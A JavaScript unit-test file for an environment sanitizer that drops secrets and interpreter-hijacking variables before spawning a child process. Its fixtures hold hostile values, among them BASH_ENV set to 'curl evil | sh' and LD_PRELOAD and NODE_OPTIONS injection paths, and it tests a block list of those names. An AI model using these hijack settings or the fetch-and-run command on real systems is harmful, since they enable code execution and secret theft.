/**
 * Environment sanitization — pure unit tests, no processes, no I/O.
 * Run: node tests/env.test.mjs
 */
import {
  sanitizeEnv, isSensitiveEnvName, ENV_ALLOWED_NAMES, ENV_BLOCKED_NAMES,
} from '../env.js'
import { assert, finish } from './helpers.mjs'

const CANARY = 'CANARY-VALUE-must-never-appear'

const hostileEnv = {
  PATH: '/usr/bin:/bin',
  HOME: '/home/dev',
  LANG: 'en_US.UTF-8',
  TZ: 'Asia/Kolkata',
  TMPDIR: '/tmp',
  /* everything below must not survive */
  GITHUB_TOKEN: CANARY,
  GH_TOKEN: CANARY,
  NPM_TOKEN: CANARY,
  AWS_SECRET_ACCESS_KEY: CANARY,
  AWS_ACCESS_KEY_ID: CANARY,
  STRIPE_API_KEY: CANARY,
  DB_PASSWORD: CANARY,
  SUPABASE_SECRET_KEY: CANARY,
  GOOGLE_APPLICATION_CREDENTIALS: CANARY,
  JWT_SESSION_TOKEN: CANARY,
  COOKIE_HEADER: CANARY,
  DEEPSEEK_API_KEY: CANARY,
  SSH_AUTH_SOCK: '/tmp/ssh-agent.sock',
  /* runtime hijack vectors — not allowlisted, and blocked by name as well */
  NODE_OPTIONS: '--require ' + CANARY,
  NODE_PATH: '/evil/modules',
  LD_PRELOAD: '/evil.so',
  DYLD_INSERT_LIBRARIES: '/evil.dylib',
  BASH_ENV: 'curl evil | sh',
  GIT_CONFIG_GLOBAL: '/home/dev/.gitconfig',
}

const { env, report } = sanitizeEnv(hostileEnv, { platform: 'linux' })

/* what survives */
assert(env.PATH === '/usr/bin:/bin', 'PATH is carried over')
assert(env.HOME === '/home/dev', 'HOME is carried over')
assert(env.LANG === 'en_US.UTF-8', 'LANG is carried over')
assert(env.TZ === 'Asia/Kolkata', 'TZ is carried over')
assert(env.TMPDIR === '/tmp', 'TMPDIR is carried over')
assert(Object.keys(env).length === 5, `exactly the five needed names survive (got ${Object.keys(env).length})`)

/* what does not */
for (const name of Object.keys(hostileEnv)) {
  if (['PATH', 'HOME', 'LANG', 'TZ', 'TMPDIR'].includes(name)) continue
  assert(env[name] === undefined, `${name} is not carried over`)
}

/* the canary is nowhere in the report either — the report is names only */
const reportJson = JSON.stringify(report)
assert(!reportJson.includes(CANARY), 'the report never contains a value')
assert(Array.isArray(report.dropped) && report.dropped.includes('GITHUB_TOKEN'), 'report lists GITHUB_TOKEN as dropped')
assert(Array.isArray(report.dropped) && report.dropped.includes('NODE_OPTIONS'), 'report lists NODE_OPTIONS as dropped')
assert(report.keptCount === 5, 'report keptCount matches the surviving names')
assert(report.droppedSensitiveCount >= 11, `report counts the sensitive drops (${report.droppedSensitiveCount})`)
/* SSH_AUTH_SOCK, NODE_OPTIONS, NODE_PATH, LD_PRELOAD, DYLD_INSERT_LIBRARIES,
   BASH_ENV, GIT_CONFIG_GLOBAL — every one of them a hijack vector. */
assert(report.droppedBlockedCount === 7, `the seven blocked vectors are counted as blocked (${report.droppedBlockedCount})`)
assert(report.kept.every((n) => typeof n === 'string'), 'report kept is a list of names')

/* nothing secret-looking is in the allowlist in the first place */
assert(ENV_ALLOWED_NAMES.every((n) => !isSensitiveEnvName(n)), 'no allowlisted name looks sensitive')
assert(ENV_ALLOWED_NAMES.includes('PATH') && ENV_ALLOWED_NAMES.includes('SystemRoot'),
  'allowlist covers what a child interpreter needs on both OS families')
assert(ENV_BLOCKED_NAMES.includes('NODE_OPTIONS') && ENV_BLOCKED_NAMES.includes('LD_PRELOAD'),
  'interpreter-hijacking names are explicitly blocked')
assert(Object.isFrozen(env) && Object.isFrozen(report), 'result and report are frozen')

/* mutating the returned env must not be possible */
let mutationThrew = false
try {
  env.EVIL = CANARY
} catch {
  mutationThrew = true
}
assert(mutationThrew || env.EVIL === undefined, 'a frozen env cannot gain a key')

/* --- net 1: blocked names are refused even if asked for as an extra --- */
{
  const r = sanitizeEnv({}, { platform: 'linux', extra: { NODE_OPTIONS: '--eval=evil', HPOS_ENGINE: 'hpos-runtime' } })
  assert(r.env.NODE_OPTIONS === undefined, 'a blocked extra never enters the child env')
  assert(r.env.HPOS_ENGINE === 'hpos-runtime', 'a benign extra is carried over')
  assert(r.report.dropped.includes('NODE_OPTIONS'), 'blocked extra is reported by name')
}

/* --- net 2: a sensitive-looking name is refused even if the allowlist has it --- */
{
  const r = sanitizeEnv({ PATH: '/bin', HOME: '/h' }, { platform: 'linux', sensitive: /PATH/i })
  assert(r.env.PATH === undefined, 'a name matching the sensitive pattern is dropped even when allowlisted')
  assert(r.env.HOME === '/h', 'the rest of the allowlist still works')
  assert(r.report.dropped.includes('PATH'), 'the sensitive drop is reported')
}

/* --- sensitive-name classifier --- */
for (const name of ['API_TOKEN', 'DB_PASSWORD', 'AWS_SECRET_ACCESS_KEY', 'CREDENTIALS', 'SESSION_COOKIE', 'DEEPSEEK_KEY']) {
  assert(isSensitiveEnvName(name), `${name} is classified sensitive`)
}
for (const name of ['PATH', 'HOME', 'LANG', 'SystemRoot', 'TZ', 'COMPUTERNAME', 'NUMBER_OF_PROCESSORS']) {
  assert(!isSensitiveEnvName(name), `${name} is a plain runtime name`)
}
assert(!isSensitiveEnvName('PATHEXT'), 'PATHEXT is not mistaken for a token-ish name')

/* --- Windows: names are case-insensitive, and canonicalised --- */
{
  const win = {
    path: 'C:\\Windows\\system32',
    systemroot: 'C:\\Windows',
    USERPROFILE: 'C:\\Users\\dev',
    OneDrive_TOKEN: CANARY,
    NODE_OPTIONS: '--require evil',
  }
  const w = sanitizeEnv(win, { platform: 'win32' })
  assert(w.env.PATH === 'C:\\Windows\\system32', 'win32: lowercase `path` is honoured as PATH')
  assert(w.env.SystemRoot === 'C:\\Windows', 'win32: canonical casing is used for SystemRoot')
  assert(w.env.USERPROFILE === 'C:\\Users\\dev', 'win32: exact matches still work')
  assert(w.env.OneDrive_TOKEN === undefined, 'win32: a sensitive name in any casing is dropped')
  assert(!JSON.stringify(w.report).includes(CANARY), 'win32: report stays values-free')

  const posix = sanitizeEnv(win, { platform: 'linux' })
  assert(posix.env.PATH === undefined, 'posix: matching is case-sensitive, `path` is not PATH')
}

/* --- degenerate inputs never blow up --- */
{
  const empty = sanitizeEnv(undefined, { platform: 'linux' })
  assert(Object.keys(empty.env).length === 0, 'no source env → no child env')
  const weird = sanitizeEnv({ PATH: 12345, HOME: '', LANG: null, TZ: undefined, EXTRA: {} }, { platform: 'linux' })
  assert(Object.keys(weird.env).length === 0, 'non-string and empty values are skipped')
  assert(weird.report.keptCount === 0, 'nothing is kept from a source of junk values')
  const dup = sanitizeEnv({ PATH: '/a' }, { platform: 'linux', extra: { PATH: '/b' } })
  assert(dup.env.PATH === '/a', 'an extra cannot overwrite an allowlisted name twice with a different value')
  assert(dup.report.kept.filter((n) => n === 'PATH').length === 1, 'kept list has no duplicate entries')
}

/* --- the daemon itself still has its token; we only scrub the child --- */
{
  const daemonSide = { ...hostileEnv, HPOS_RUNTIME_HOME: '/home/dev/.hpos/runtime' }
  const scrubbed = sanitizeEnv(daemonSide, { platform: 'linux' })
  assert(scrubbed.env.HPOS_RUNTIME_HOME === undefined, 'the state dir path is not passed to the child')
  assert(!JSON.stringify(scrubbed).includes('CANARY'), 'no secret value anywhere in the result')
}

finish('runtime env')
